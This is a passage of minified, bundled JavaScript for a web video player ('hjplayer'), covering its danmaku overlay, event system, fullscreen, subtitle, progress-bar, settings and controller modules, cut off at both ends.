													.bottom = n * r + "px");
												break;
											default:
												console.error(
													"Can't handled danmaku type: " + e[
														a].type)
										}
										r >= 0 && (o.classList.add(
												"hjplayer-danmaku-move"), u
											.appendChild(o))
									}(d);
									return this.container.appendChild(u), u
								}
							}
						}, {
							key: "play",
							value: function() {
								this.paused = !1
							}
						}, {
							key: "pause",
							value: function() {
								this.paused = !0
							}
						}, {
							key: "_measure",
							value: function(e) {
								if (!this.context) {
									var t = getComputedStyle(this.container
										.getElementsByClassName("hjplayer-danmaku-item")[
											0], null);
									this.context = document.createElement("canvas").getContext(
										"2d"), this.context.font = t.getPropertyValue(
										"font")
								}
								return this.context.measureText(e).width
							}
						}, {
							key: "seek",
							value: function() {
								this.clear();
								for (var e = 0; e < this.dan.length; e++) {
									if (this.dan[e].time >= this.options.time()) {
										this.danIndex = e;
										break
									}
									this.danIndex = this.dan.length
								}
							}
						}, {
							key: "clear",
							value: function() {
								this.danTunnel = {
										right: {},
										top: {},
										bottom: {}
									}, this.danIndex = 0, this.options.container.innerHTML = "",
									this.events && this.events.trigger(
										"danmaku_clear")
							}
						}, {
							key: "htmlEncode",
							value: function(e) {
								return e.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(
									/>/g, "&gt;").replace(/"/g, "&quot;").replace(
									/'/g, "&#x27;").replace(/\//g, "&#x2f;")
							}
						}, {
							key: "resize",
							value: function() {
								for (var e = this.container.offsetWidth, t = this.container
										.getElementsByClassName(
											"hjplayer-danmaku-item"), n = 0; n < t.length; n++)
									t[n].style.transform = "translateX(-" + e + "px)"
							}
						}, {
							key: "hide",
							value: function() {
								this.showing = !1, this.pause(), this.clear(), this.events &&
									this.events.trigger("danmaku_hide")
							}
						}, {
							key: "show",
							value: function() {
								this.seek(), this.showing = !0, this.play(), this.events && this
									.events.trigger("danmaku_show")
							}
						}, {
							key: "unlimit",
							value: function(e) {
								this.unlimited = e
							}
						}]), e
					}();
				t.default = s
			},
			function(e, t, n) {
				function i(e, t) {
					if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
				}
				Object.defineProperty(t, "__esModule", {
					value: !0
				});
				var a = function() {
						function e(e, t) {
							for (var n = 0; n < t.length; n++) {
								var i = t[n];
								i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i
									.writable = !0), Object.defineProperty(
									e, i.key, i)
							}
						}
						return function(t, n, i) {
							return n && e(t.prototype, n), i && e(t, i), t
						}
					}(),
					o = function() {
						function e() {
							i(this, e), this.events = {}, this.videoEvents = ["abort", "canplay",
								"canplaythrough", "durationchange",
								"emptied", "ended", "error", "loadeddata", "loadedmetadata", "loadstart",
								"mozaudioavailable", "pause",
								"play", "playing", "progress", "ratechange", "seeked", "seeking", "stalled",
								"suspend", "timeupdate",
								"volumechange", "waiting"
							], this.playerEvents = ["screenshot", "thumbnails_show", "thumbnails_hide",
								"danmaku_show", "danmaku_hide",
								"danmaku_clear", "danmaku_loaded", "danmaku_send", "danmaku_opacity",
								"contextmenu_show", "contextmenu_hide",
								"notice_show", "notice_hide", "quality_start", "quality_end", "destroy",
								"resize", "fullscreen",
								"fullscreen_cancel", "webfullscreen", "webfullscreen_cancel",
								"subtitle_show", "subtitle_hide",
								"subtitle_change"
							]
						}
						return a(e, [{
							key: "on",
							value: function(e, t) {
								this.type(e) && "function" == typeof t && (this.events[e] || (
									this.events[e] = []), this.events[e].push(t))
							}
						}, {
							key: "trigger",
							value: function(e, t) {
								if (this.events[e] && this.events[e].length)
									for (var n = 0; n < this.events[e].length; n++) this.events[
										e][n](t)
							}
						}, {
							key: "type",
							value: function(e) {
								return -1 !== this.playerEvents.indexOf(e) ? "player" : -1 !==
									this.videoEvents.indexOf(e) ? "video" : (
										console.error("Unknown event name: " + e), null)
							}
						}]), e
					}();
				t.default = o
			},
			function(e, t, n) {
				function i(e, t) {
					if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
				}
				Object.defineProperty(t, "__esModule", {
					value: !0
				});
				var a = function() {
						function e(e, t) {
							for (var n = 0; n < t.length; n++) {
								var i = t[n];
								i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i
									.writable = !0), Object.defineProperty(
									e, i.key, i)
							}
						}
						return function(t, n, i) {
							return n && e(t.prototype, n), i && e(t, i), t
						}
					}(),
					o = n(0),
					s = function(e) {
						return e && e.__esModule ? e : {
							default: e
						}
					}(o),
					r = function() {
						function e(t) {
							var n = this;
							i(this, e), this.player = t, this.player.events.on("webfullscreen", function() {
								n.player.resize()
							}), this.player.events.on("webfullscreen_cancel", function() {
								n.player.resize(), s.default.setScrollPosition(n.lastScrollPosition)
							});
							var a = function() {
								n.player.resize(), n.isFullScreen("browser") ? n.player.events.trigger(
									"fullscreen") : (s.default.setScrollPosition(
									n.lastScrollPosition), n.player.events.trigger(
									"fullscreen_cancel"))
							};
							this.player.container.addEventListener("fullscreenchange", a), this.player.container
								.addEventListener(
									"mozfullscreenchange", a), this.player.container.addEventListener(
									"webkitfullscreenchange", a)
						}
						return a(e, [{
							key: "isFullScreen",
							value: function() {
								switch (arguments.length > 0 && void 0 !== arguments[0] ?
									arguments[0] : "browser") {
									case "browser":
										return document.fullscreenElement || document
											.mozFullScreenElement || document
											.webkitFullscreenElement;
									case "web":
										return this.player.container.classList.contains(
											"hjplayer-fulled")
								}
							}
						}, {
							key: "request",
							value: function() {
								var e = arguments.length > 0 && void 0 !== arguments[0] ?
									arguments[0] : "browser",
									t = "browser" === e ? "web" : "browser",
									n = this.isFullScreen(t);
								switch (n || (this.lastScrollPosition = s.default
										.getScrollPosition()), e) {
									case "browser":
										this.player.container.requestFullscreen ? this.player
											.container.requestFullscreen() : this.player
											.container
											.mozRequestFullScreen ? this.player.container
											.mozRequestFullScreen() : this.player.container
											.webkitRequestFullscreen ?
											this.player.container.webkitRequestFullscreen() :
											this.player.video.webkitEnterFullscreen && this
											.player
											.video.webkitEnterFullscreen();
										break;
									case "web":
										this.player.container.classList.add("hjplayer-fulled"),
											document.body.classList.add(
												"hjplayer-web-fullscreen-fix"), this.player
											.events.trigger("webfullscreen")
								}
								n && this.cancel(t)
							}
						}, {
							key: "cancel",
							value: function() {
								switch (arguments.length > 0 && void 0 !== arguments[0] ?
									arguments[0] : "browser") {
									case "browser":
										document.cancelFullScreen ? document
											.cancelFullScreen() : document.mozCancelFullScreen ?
											document.mozCancelFullScreen() :
											document.webkitCancelFullScreen && document
											.webkitCancelFullScreen();
										break;
									case "web":
										this.player.container.classList.remove(
												"hjplayer-fulled"), document.body.classList
											.remove(
												"hjplayer-web-fullscreen-fix"), this.player
											.events.trigger("webfullscreen_cancel")
								}
							}
						}, {
							key: "toggle",
							value: function() {
								var e = arguments.length > 0 && void 0 !== arguments[0] ?
									arguments[0] : "browser";
								this.isFullScreen(e) ? this.cancel(e) : this.request(e)
							}
						}]), e
					}();
				t.default = r
			},
			function(e, t, n) {
				function i(e, t) {
					if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
				}
				Object.defineProperty(t, "__esModule", {
					value: !0
				});
				var a = function() {
						function e(e, t) {
							for (var n = 0; n < t.length; n++) {
								var i = t[n];
								i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i
									.writable = !0), Object.defineProperty(
									e, i.key, i)
							}
						}
						return function(t, n, i) {
							return n && e(t.prototype, n), i && e(t, i), t
						}
					}(),
					o = n(0),
					s = function(e) {
						return e && e.__esModule ? e : {
							default: e
						}
					}(o),
					r = function() {
						function e(t) {
							i(this, e), this.storageName = {
								opacity: "hjplayer-danmaku-opacity",
								volume: "hjplayer-volume",
								unlimited: "hjplayer-danmaku-unlimited",
								danmaku: "hjplayer-danmaku-show",
								subtitle: "hjplayer-subtitle-show"
							}, this.default = {
								opacity: .7,
								volume: t.options.volume || .7,
								unlimited: (t.options.danmaku && t.options.danmaku.unlimited ? 1 : 0) || 0,
								danmaku: 1,
								subtitle: 1
							}, this.data = {}, this.init()
						}
						return a(e, [{
							key: "init",
							value: function() {
								for (var e in this.storageName) {
									var t = this.storageName[e];
									this.data[e] = parseFloat(s.default.storage.get(t) || this
										.default[e])
								}
							}
						}, {
							key: "get",
							value: function(e) {
								return this.data[e]
							}
						}, {
							key: "set",
							value: function(e, t) {
								this.data[e] = t, s.default.storage.set(this.storageName[e], t)
							}
						}]), e
					}();
				t.default = r
			},
			function(e, t, n) {
				function i(e, t) {
					if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
				}
				Object.defineProperty(t, "__esModule", {
					value: !0
				});
				var a = function() {
						function e(e, t) {
							for (var n = 0; n < t.length; n++) {
								var i = t[n];
								i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i
									.writable = !0), Object.defineProperty(
									e, i.key, i)
							}
						}
						return function(t, n, i) {
							return n && e(t.prototype, n), i && e(t, i), t
						}
					}(),
					o = function() {
						function e(t, n, a, o) {
							i(this, e), this.container = t, this.video = n, this.options = a, this.events = o,
								this.init()
						}
						return a(e, [{
							key: "init",
							value: function() {
								var e = this;
								if (this.container.style.fontSize = this.options.fontSize, this
									.container.style.bottom = this.options.bottom,
									this.container.style.color = this.options.color, this.video
									.textTracks && this.video.textTracks[0]) {
									var t = this.video.textTracks[0];
									t.oncuechange = function() {
										var n = t.activeCues[0];
										if (n) {
											e.container.innerHTML = "";
											var i = document.createElement("p");
											i.appendChild(n.getCueAsHTML()), e.container
												.appendChild(i)
										} else e.container.innerHTML = "";
										e.events.trigger("subtitle_change")
									}
								}
							}
						}, {
							key: "show",
							value: function() {
								this.container.classList.remove("hjplayer-subtitle-hide"), this
									.events.trigger("subtitle_show")
							}
						}, {
							key: "hide",
							value: function() {
								this.container.classList.add("hjplayer-subtitle-hide"), this
									.events.trigger("subtitle_hide")
							}
						}, {
							key: "toggle",
							value: function() {
								this.container.classList.contains("hjplayer-subtitle-hide") ?
									this.show() : this.hide()
							}
						}]), e
					}();
				t.default = o
			},
			function(e, t, n) {
				function i(e, t) {
					if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
				}
				Object.defineProperty(t, "__esModule", {
					value: !0
				});
				var a = function() {
						function e(e, t) {
							for (var n = 0; n < t.length; n++) {
								var i = t[n];
								i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i
									.writable = !0), Object.defineProperty(
									e, i.key, i)
							}
						}
						return function(t, n, i) {
							return n && e(t.prototype, n), i && e(t, i), t
						}
					}(),
					o = function() {
						function e(t) {
							i(this, e), this.elements = {}, this.elements.volume = t.volumeBar, this.elements
								.played = t.playedBar, this.elements
								.loaded = t.loadedBar, this.elements.danmaku = t.danmakuOpacityBar
						}
						return a(e, [{
							key: "set",
							value: function(e, t, n) {
								t = Math.max(t, 0), t = Math.min(t, 1), this.elements[e].style[
									n] = 100 * t + "%"
							}
						}, {
							key: "get",
							value: function(e) {
								return parseFloat(this.elements[e].style.width) / 100
							}
						}]), e
					}();
				t.default = o
			},
			function(e, t, n) {
				function i(e, t) {
					if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
				}
				Object.defineProperty(t, "__esModule", {
					value: !0
				});
				var a = function() {
						function e(e, t) {
							for (var n = 0; n < t.length; n++) {
								var i = t[n];
								i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i
									.writable = !0), Object.defineProperty(
									e, i.key, i)
							}
						}
						return function(t, n, i) {
							return n && e(t.prototype, n), i && e(t, i), t
						}
					}(),
					o = n(0),
					s = function(e) {
						return e && e.__esModule ? e : {
							default: e
						}
					}(o),
					r = function() {
						function e(t) {
							i(this, e), this.player = t, window.requestAnimationFrame = function() {
								return window.requestAnimationFrame || window.webkitRequestAnimationFrame ||
									window.mozRequestAnimationFrame ||
									window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
									function(e) {
										window.setTimeout(e, 1e3 / 60)
									}
							}(), this.types = ["loading", "progress", "info", "fps"], this.init()
						}
						return a(e, [{
							key: "init",
							value: function() {
								for (var e = 0; e < this.types.length; e++) {
									var t = this.types[e];
									"fps" !== t && this["init" + t + "Checker"]()
								}
							}
						}, {
							key: "initloadingChecker",
							value: function() {
								var e = this,
									t = 0,
									n = 0,
									i = !1;
								this.loadingChecker = setInterval(function() {
									e.enableloadingChecker && (n = e.player.video
										.currentTime, i || n !== t || e.player.video
										.paused || (e
											.player.container.classList.add(
												"hjplayer-loading"), i = !0), i &&
										n > t && !e.player.video.paused &&
										(e.player.container.classList.remove(
											"hjplayer-loading"), i = !1), t = n)
								}, 100)
							}
						}, {
							key: "initprogressChecker",
							value: function() {
								var e = this;
								this.progressChecker = setInterval(function() {
									if (e.enableprogressChecker) {
										e.player.bar.set("played", e.player.video
											.currentTime / e.player.video.duration,
											"width");
										var t = s.default.secondToTime(e.player.video
											.currentTime);
										e.player.template.ptime.innerHTML !== t && (e
											.player.template.ptime.innerHTML = s
											.default.secondToTime(
												e.player.video.currentTime))
									}
								}, 100)
							}
						}, {
							key: "initfpsChecker",
							value: function() {
								var e = this;
								window.requestAnimationFrame(function() {
									if (e.enablefpsChecker)
										if (e.initfpsChecker(), e.fpsStart) {
											e.fpsIndex++;
											var t = new Date;
											t - e.fpsStart > 1e3 && (e.player.infoPanel
												.fps(e.fpsIndex / (t - e.fpsStart) *
													1e3), e.fpsStart =
												new Date, e.fpsIndex = 0)
										} else e.fpsStart = new Date, e.fpsIndex = 0;
									else e.fpsStart = 0, e.fpsIndex = 0
								})
							}
						}, {
							key: "initinfoChecker",
							value: function() {
								var e = this;
								this.infoChecker = setInterval(function() {
									e.enableinfoChecker && e.player.infoPanel.update()
								}, 1e3)
							}
						}, {
							key: "enable",
							value: function(e) {
								this["enable" + e + "Checker"] = !0, "fps" === e && this
									.initfpsChecker()
							}
						}, {
							key: "disable",
							value: function(e) {
								this["enable" + e + "Checker"] = !1
							}
						}, {
							key: "destroy",
							value: function(e) {
								this[e + "Checker"] && clearInterval(this[e + "Checker"])
							}
						}]), e
					}();
				t.default = r
			},
			function(e, t, n) {
				function i(e, t) {
					if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
				}
				Object.defineProperty(t, "__esModule", {
					value: !0
				});
				var a = function() {
						function e(e, t) {
							for (var n = 0; n < t.length; n++) {
								var i = t[n];
								i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i
									.writable = !0), Object.defineProperty(
									e, i.key, i)
							}
						}
						return function(t, n, i) {
							return n && e(t.prototype, n), i && e(t, i), t
						}
					}(),
					o = function() {
						function e(t) {
							var n = this;
							i(this, e), this.container = t, this.container.addEventListener("animationend",
								function() {
									n.container.classList.remove("hjplayer-bezel-transition")
								})
						}
						return a(e, [{
							key: "switch",
							value: function(e) {
								this.container.innerHTML = e, this.container.classList.add(
									"hjplayer-bezel-transition")
							}
						}]), e
					}();
				t.default = o
			},
			function(e, t, n) {
				function i(e) {
					return e && e.__esModule ? e : {
						default: e
					}
				}

				function a(e, t) {
					if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
				}
				Object.defineProperty(t, "__esModule", {
					value: !0
				});
				var o = function() {
						function e(e, t) {
							for (var n = 0; n < t.length; n++) {
								var i = t[n];
								i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i
									.writable = !0), Object.defineProperty(
									e, i.key, i)
							}
						}
						return function(t, n, i) {
							return n && e(t.prototype, n), i && e(t, i), t
						}
					}(),
					s = n(0),
					r = i(s),
					l = n(44),
					c = i(l),
					u = n(2),
					d = i(u),
					p = function() {
						function e(t) {
							var n = this;
							a(this, e), this.player = t, this.autoHideTimer = 0, r.default.isMobile || (this
									.player.container.addEventListener(
										"mousemove",
										function() {
											n.setAutoHide()
										}), this.player.container.addEventListener("click", function() {
										n.setAutoHide()
									}), this.player.on("play", function() {
										n.setAutoHide()
									}), this.player.on("pause", function() {
										n.setAutoHide()
									})), this.initPlayButton(), this.initThumbnails(), this.initPlayedBar(),
								this.initFullButton(), this.initQualityButton(),
								this.initScreenshotButton(), this.initSubtitleButton(), r.default.isMobile ||
								this.initVolumeButton()
						}
						return o(e, [{
							key: "initPlayButton",
							value: function() {
								var e = this;
								this.player.template.playButton.addEventListener("click",
									function() {
										e.player.toggle()
									}), r.default.isMobile ? (this.player.template.videoWrap
									.addEventListener("click", function() {
										e.toggle()
									}), this.player.template.controllerMask
									.addEventListener("click", function() {
										e.toggle()
									})) : (this.player.template.videoWrap.addEventListener(
										"click",
										function() {
											e.player.toggle()
										}), this.player.template.controllerMask
									.addEventListener("click", function() {
										e.player.toggle()
									}))
							}
						}, {
							key: "initThumbnails",
							value: function() {
								var e = this;
								this.player.options.video.thumbnails && (this.thumbnails = new c
									.default({
										container: this.player.template.barPreview,
										barWidth: this.player.template.barWrap
											.offsetWidth,
										url: this.player.options.video.thumbnails,
										events: this.player.events
									}), this.player.on("loadedmetadata", function() {
										e.thumbnails.resize(160, e.player.video
											.videoHeight / e.player.video
											.videoWidth * 160)
									}))
							}
						}, {
							key: "initPlayedBar",
							value: function() {
								var e = this,
									t = function(t) {
										var n = ((t.clientX || t.changedTouches[0].clientX) - r
												.default.getElementViewLeft(e.player.template
													.playedBarWrap)) /
											e.player.template.playedBarWrap.clientWidth;
										n = Math.max(n, 0), n = Math.min(n, 1), e.player.bar
											.set("played", n, "width"), e.player.template.ptime
											.innerHTML = r.default.secondToTime(n * e.player
												.video.duration)
									},
									n = function n(i) {
										document.removeEventListener(r.default.nameMap.dragEnd,
											n), document.removeEventListener(r.default
											.nameMap
											.dragMove, t);
										var a = ((i.clientX || i.changedTouches[0].clientX) - r
												.default.getElementViewLeft(e.player.template
													.playedBarWrap)) /
											e.player.template.playedBarWrap.clientWidth;
										a = Math.max(a, 0), a = Math.min(a, 1), e.player.bar
											.set("played", a, "width"), e.player.seek(e.player
												.bar
												.get("played") * e.player.video.duration), e
											.player.time.enable("progress")
									};
								this.player.template.playedBarWrap.addEventListener(r.default
									.nameMap.dragStart,
									function() {
										e.player.time.disable("progress"), document
											.addEventListener(r.default.nameMap.dragMove,
												t), document.addEventListener(
												r.default.nameMap.dragEnd, n)
									}), this.player.template.playedBarWrap.addEventListener(
									r.default.nameMap.dragMove,
									function(t) {
										if (e.player.video.duration) {
											var n = r.default.cumulativeOffset(e.player
													.template.playedBarWrap).left,
												i = (t.clientX || t.changedTouches[0]
													.clientX) - n;
											if (i < 0 || i > e.player.template.playedBarWrap
												.offsetWidth) return;
											var a = e.player.video.duration * (i / e.player
												.template.playedBarWrap.offsetWidth);
											r.default.isMobile && e.thumbnails && e
												.thumbnails.show(), e.thumbnails && e
												.thumbnails.move(i), e.player
												.template.playedBarTime.style.left = i -
												20 + "px", e.player.template.playedBarTime
												.innerText = r.default
												.secondToTime(a), e.player.template
												.playedBarTime.classList.remove("hidden")
										}
									}), this.player.template.playedBarWrap.addEventListener(
									r.default.nameMap.dragEnd,
									function() {
										r.default.isMobile && e.thumbnails && e.thumbnails
											.hide()
									}), r.default.isMobile || (this.player.template
									.playedBarWrap.addEventListener("mouseenter",
										function() {
											e.player.video.duration && (e.thumbnails && e
												.thumbnails.show(), e.player.template
												.playedBarTime.classList
												.remove("hidden"))
										}), this.player.template.playedBarWrap
									.addEventListener(
										"mouseleave",
										function() {
											e.player.video.duration && (e.thumbnails && e
												.thumbnails.hide(), e.player.template
												.playedBarTime.classList
												.add("hidden"))
										}))
							}
						}, {
							key: "initFullButton",
							value: function() {
								var e = this;
								this.player.template.browserFullButton.addEventListener("click",
									function() {
										e.player.fullScreen.toggle("browser")
									}), this.player.template.webFullButton.addEventListener(
									"click",
									function() {
										e.player.fullScreen.toggle("web")
									})
							}
						}, {
							key: "initVolumeButton",
							value: function() {
								var e = this,
									t = function(t) {
										var n = t || window.event,
											i = ((n.clientX || n.changedTouches[0].clientX) - r
												.default.getElementViewLeft(e.player.template
													.volumeBarWrap) -
												5.5) / 35;
										e.player.volume(i)
									},
									n = function n() {
										document.removeEventListener(r.default.nameMap.dragEnd,
												n), document.removeEventListener(r.default
												.nameMap
												.dragMove, t), e.player.template.volumeButton
											.classList.remove("hjplayer-volume-active")
									};
								this.player.template.volumeBarWrapWrap.addEventListener("click",
										function(t) {
											var n = t || window.event,
												i = ((n.clientX || n.changedTouches[0]
														.clientX) - r.default
													.getElementViewLeft(e
														.player.template.volumeBarWrap) -
													5.5) / 35;
											e.player.volume(i)
										}), this.player.template.volumeBarWrapWrap
									.addEventListener(r.default.nameMap.dragStart, function() {
										document.addEventListener(r.default.nameMap
												.dragMove, t), document.addEventListener(r
												.default.nameMap.dragEnd,
												n), e.player.template.volumeButton.classList
											.add("hjplayer-volume-active")
									}), this.player.template.volumeIcon.addEventListener(
										"click",
										function() {
											e.player.video.muted ? (e.player.video.muted = !1, e
													.player.switchVolumeIcon(), e.player.bar
													.set(
														"volume", e.player.volume(), "width")) :
												(e.player.video.muted = !0, e.player.template
													.volumeIcon.innerHTML =
													d.default.volumeOff, e.player.bar.set(
														"volume", 0, "width"))
										})
							}
						}, {
							key: "initQualityButton",
							value: function() {
								var e = this;
								this.player.options.video.quality && this.player.template
									.qualityList.addEventListener("click", function(
										t) {
										t.target.classList.contains(
												"hjplayer-quality-item") && e.player
											.switchQuality(t.target.dataset.index)
									})
							}
						}, {
							key: "initScreenshotButton",
							value: function() {
								var e = this;
								this.player.options.screenshot && this.player.template
									.camareButton.addEventListener("click", function() {
										var t = document.createElement("canvas");
										t.width = e.player.video.videoWidth, t.height = e
											.player.video.videoHeight, t.getContext("2d")
											.drawImage(
												e.player.video, 0, 0, t.width, t.height);
										var n = t.toDataURL();
										e.player.template.camareButton.href = n, e.player
											.template.camareButton.download =
											"hjplayer.png", e.player
											.events.trigger("screenshot", n)
									})
							}
						}, {
							key: "initSubtitleButton",
							value: function() {
								var e = this;
								this.player.options.subtitle && (this.player.events.on(
										"subtitle_show",
										function() {
											e.player.template.subtitleButton.dataset
												.balloon = e.player.tran("Hide subtitle"), e
												.player.template.subtitleButtonInner
												.style.opacity = "", e.player.user.set(
													"subtitle", 1)
										}), this.player.events.on("subtitle_hide",
										function() {
											e.player.template.subtitleButton.dataset
												.balloon = e.player.tran("Show subtitle"), e
												.player.template.subtitleButtonInner
												.style.opacity = "0.4", e.player.user.set(
													"subtitle", 0)
										}), this.player.template.subtitleButton
									.addEventListener("click", function() {
										e.player.subtitle.toggle()
									}))
							}
						}, {
							key: "setAutoHide",
							value: function() {
								var e = this;
								this.show(), clearTimeout(this.autoHideTimer), this
									.autoHideTimer = setTimeout(function() {
										!e.player.video.played.length || e.player.paused ||
											e.disableAutoHide || e.hide()
									}, 3e3)
							}
						}, {
							key: "show",
							value: function() {
								this.player.container.classList.remove(
									"hjplayer-hide-controller")
							}
						}, {
							key: "hide",
							value: function() {
								this.player.container.classList.add(
										"hjplayer-hide-controller"), this.player.setting
									.hide(),
									this.player
									.comment && this.player.comment.hide()
							}
						}, {
							key: "isShow",
							value: function() {
								return !this.player.container.classList.contains(
									"hjplayer-hide-controller")
							}
						}, {
							key: "toggle",
							value: function() {
								this.isShow() ? this.hide() : this.show()
							}
						}, {
							key: "destroy",
							value: function() {
								clearTimeout(this.autoHideTimer)
							}
						}]), e
					}();
				t.default = p
			},
			function(e, t, n) {
				function i(e, t) {
					if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
				}
				Object.defineProperty(t, "__esModule", {
					value: !0
				});
				var a = function() {
						function e(e, t) {
							for (var n = 0; n < t.length; n++) {
								var i = t[n];
								i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i
									.writable = !0), Object.defineProperty(
									e, i.key, i)
							}
						}
						return function(t, n, i) {
							return n && e(t.prototype, n), i && e(t, i), t
						}
					}(),
					o = function() {
						function e(t) {
							i(this, e), this.container = t.container, this.barWidth = t.barWidth, this.container
								.style.backgroundImage =
								"url('" + t.url + "')", this.events = t.events
						}
						return a(e, [{
							key: "resize",
							value: function(e, t) {
								this.container.style.width = e + "px", this.container.style
									.height = t + "px", this.container.style.top =
									2 - t + "px"
							}
						}, {
							key: "show",
							value: function() {
								this.container.style.display = "block", this.events && this
									.events.trigger("thumbnails_show")
							}
						}, {
							key: "move",
							value: function(e) {
								this.container.style.backgroundPosition = "-" + 160 * (Math
										.ceil(e / this.barWidth * 100) - 1) + "px 0",
									this.container.style.left = e - this.container.offsetWidth /
									2 + "px"
							}
						}, {
							key: "hide",
							value: function() {
								this.container.style.display = "none", this.events && this
									.events.trigger("thumbnails_hide")
							}
						}]), e
					}();
				t.default = o
			},
			function(e, t, n) {
				function i(e, t) {
					if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
				}
				Object.defineProperty(t, "__esModule", {
					value: !0
				});
				var a = function() {
						function e(e, t) {
							for (var n = 0; n < t.length; n++) {
								var i = t[n];
								i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i
									.writable = !0), Object.defineProperty(
									e, i.key, i)
							}
						}
						return function(t, n, i) {
							return n && e(t.prototype, n), i && e(t, i), t
						}
					}(),
					o = n(0),
					s = function(e) {
						return e && e.__esModule ? e : {
							default: e
						}
					}(o),
					r = function() {
						function e(t) {
							var n = this;
							i(this, e), this.player = t, this.player.template.mask.addEventListener("click",
									function() {
										n.hide()
									}), this.player.template.settingButton.addEventListener("click",
									function() {
										n.show()
									}), this.loop = this.player.options.loop, this.player.template.loopToggle
								.checked = this.loop, this.player.template
								.loop.addEventListener("click", function() {
									n.player.template.loopToggle.checked = !n.player.template.loopToggle
										.checked, n.player.template.loopToggle.checked ?
										n.loop = !0 : n.loop = !1, n.hide()
								}), this.showDanmaku = this.player.user.get("danmaku"), this.showDanmaku || this
								.player.danmaku && this.player
								.danmaku.hide(), this.player.template.showDanmakuToggle.checked = this
								.showDanmaku, this.player.template.showDanmaku
								.addEventListener("click", function() {
									n.player.template.showDanmakuToggle.checked = !n.player.template
										.showDanmakuToggle.checked, n.player.template
										.showDanmakuToggle.checked ? (n.showDanmaku = !0, n.player.danmaku
											.show()) : (n.showDanmaku = !1, n.player
											.danmaku.hide()), n.player.user.set("danmaku", n.showDanmaku ?
											1 : 0), n.hide()
								}), this.unlimitDanmaku = this.player.user.get("unlimited"), this.player
								.template.unlimitDanmakuToggle.checked =
								this.unlimitDanmaku, this.player.template.unlimitDanmaku.addEventListener(
									"click",
									function() {
										n.player.template.unlimitDanmakuToggle.checked = !n.player.template
											.unlimitDanmakuToggle.checked, n.player.template
											.unlimitDanmakuToggle.checked ? (n.unlimitDanmaku = !0, n.player
												.danmaku.unlimit(!0)) : (n.unlimitDanmaku = !
												1, n.player.danmaku.unlimit(!1)), n.player.user.set("unlimited",
												n.unlimitDanmaku ? 1 : 0), n.hide()
									}), this.player.template.speed.addEventListener("click", function() {
									n.player.template.settingBox.classList.add(
											"hjplayer-setting-box-narrow"), n.player.template.settingBox
										.classList
										.add("hjplayer-setting-box-speed")
								});
							for (var a = 0; a < this.player.template.speedItem.length; a++) ! function(e) {
								n.player.template.speedItem[e].addEventListener("click", function() {
									n.player.speed(n.player.template.speedItem[e].dataset.speed), n
										.hide()
								})
							}(a);
							if (this.player.danmaku) {
								this.player.on("danmaku_opacity", function(e) {
									n.player.bar.set("danmaku", e, "width"), n.player.user.set(
										"opacity", e)
								}), this.player.danmaku.opacity(this.player.user.get("opacity"));
								var o = function(e) {
										var t = e || window.event,
											i = ((t.clientX || t.changedTouches[0].clientX) - s.default
												.getElementViewLeft(n.player.template.danmakuOpacityBarWrap)) /
											130;
										i = Math.max(i, 0), i = Math.min(i, 1), n.player.danmaku.opacity(i)
									},
									r = function e() {
										document.removeEventListener(s.default.nameMap.dragEnd, e), document
											.removeEventListener(s.default.nameMap.dragMove,
												o), n.player.template.danmakuOpacityBox.classList.remove(
												"hjplayer-setting-danmaku-active")
									};
								this.player.template.danmakuOpacityBarWrapWrap.addEventListener("click",
									function(e) {
										var t = e || window.event,
											i = ((t.clientX || t.changedTouches[0].clientX) - s.default
												.getElementViewLeft(n.player.template.danmakuOpacityBarWrap)
											) /
											130;
										i = Math.max(i, 0), i = Math.min(i, 1), n.player.danmaku.opacity(i)
									}), this.player.template.danmakuOpacityBarWrapWrap.addEventListener(s
									.default.nameMap.dragStart,
									function() {
										document.addEventListener(s.default.nameMap.dragMove, o), document
											.addEventListener(s.default.nameMap.dragEnd,
												r), n.player.template.danmakuOpacityBox.classList.add(
												"hjplayer-setting-danmaku-active")
									})
							}
						}
						return a(e, [{
							key: "hide",
							value: function() {
								var e = this;
								this.player.template.settingBox.classList.remove(
										"hjplayer-setting-box-open"), this.player.template.mask
									.classList.remove("hjplayer-mask-show"), setTimeout(
										function() {
											e.player.template.settingBox.classList.remove(
													"hjplayer-setting-box-narrow"), e.player
												.template.settingBox
												.classList.remove("hjplayer-setting-box-speed")
										}, 300), this.player.controller.disableAutoHide = !1
							}
						}, {
							key: "show",
							value: function() {
								this.player.template.settingBox.classList.add(
										"hjplayer-setting-box-open"), this.player.template.mask
									.classList
									.add("hjplayer-mask-show"), this.player.controller
									.disableAutoHide = !0
							}
						}]), e
					}();
				t.default = r
			},
			function(e, t, n) {
				function i(e, t) {
					if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
				}
				Object.defineProperty(t, "__esModule", {
					value: !0
				});
				var a = function() {
						function e(e, t) {
							for (var n = 0; n < t.length; n++) {
								var i = t[n];
								i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i
									.writable = !0), Object.defineProperty(
									e, i.key, i)
							}
						}
						return function(t, n, i) {
							return n && e(t.prototype, n), i && e(t, i), t
						}
					}(),
					o = function() {
						function e(t) {
							var n = this;
							i(this, e), this.player = t, this.player.template.mask.addEventListener("click",
								function() {
									n.hide()
								}), this.player.template.commentButton.addEventListener("click",
								function() {
									n.show()
								}), this.player.template.yzmcomment.addEventListener("click", function() {
								n.show()
